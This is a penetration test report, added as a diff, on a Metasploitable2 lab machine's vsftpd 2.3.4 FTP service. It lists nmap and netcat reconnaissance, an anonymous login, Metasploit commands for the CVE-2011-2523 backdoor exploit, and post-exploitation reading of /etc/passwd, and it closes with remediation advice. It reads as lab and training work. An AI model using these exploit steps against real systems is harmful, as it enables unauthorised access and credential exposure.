@@ -1,0 +1,93 @@
+Penetration Testing Report – Metasploitable2 (Port 21 - FTP)
+
+1. Test Date : 12-06-25
+    Test by : [ me ]
+    
+2. Target Information
+- Target IP: 192.168.1.101
+- Operating System: Linux (Ubuntu-based)
+- FTP Server: vsftpd 2.3.4
+- Port in Scope: 21/tcp
+- Tools Used: Nmap, Netcat, Metasploit, FTP client
+
+3. Reconnaissance
+
+3.1 Nmap Scan
+Command:
+nmap -sV -p 21 192.168.1.101
+
+Result:
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 2.3.4
+
+Interpretation:
+vsftpd 2.3.4 is a known vulnerable FTP server. This version contains a backdoor that opens a shell on port 6200 when a specially crafted username is submitted.
+
+4. Enumeration
+
+4.1 Banner Grabbing
+Command:
+nc 192.168.1.101 21
+
+Output:
+220 (vsFTPd 2.3.4)
+
+4.2 Anonymous Login Test
+Command:
+ftp 192.168.1.101
+
+Login:
+Username: anonymous
+Password: (any)
+
+Result:
+- Anonymous login: Successful
+- Able to list directories, upload/download files
+
+5. Exploitation
+
+5.1 Exploit: Backdoor Command Execution (CVE-2011-2523)
+vsftpd 2.3.4 contains a backdoor triggered by usernames containing `:)`.
+
+5.2 Using Metasploit
+
+Command:
+msfconsole
+
+Module:
+use exploit/unix/ftp/vsftpd_234_backdoor
+
+Set options:
+set RHOST 192.168.1.101
+set RPORT 21
+run
+
+Result:
+[*] Backdoor service has been spawned
+[*] Command shell session 1 opened
+
+Shell access obtained as: nobody (limited shell)
+
+6. Post-Exploitation
+
+Commands run:
+- whoami → nobody
+- uname -a → kernel version
+- cat /etc/passwd → found default users
+- Checked for privilege escalation paths
+
+Notes:
+- Privilege escalation possible via local exploits
+- Pivoting to root user achieved via known kernel exploits
+
+7. Recommendations
+
+- Immediately remove or update vsftpd to a secure version
+- Disable anonymous FTP login
+- Restrict FTP access to trusted IPs only
+- Monitor logs for unusual activity
+- Replace FTP with secure alternatives (e.g., SFTP)
+
+8. Conclusion
+
+Port 21 (FTP) on 192.168.1.101 was vulnerable due to an outdated and backdoored vsftpd service (v2.3.4). Anonymous login was enabled, and full system compromise was achieved via the Metasploit `vsftpd_234_backdoor` exploit. This demonstrates a critical security flaw that must be remediated immediately.
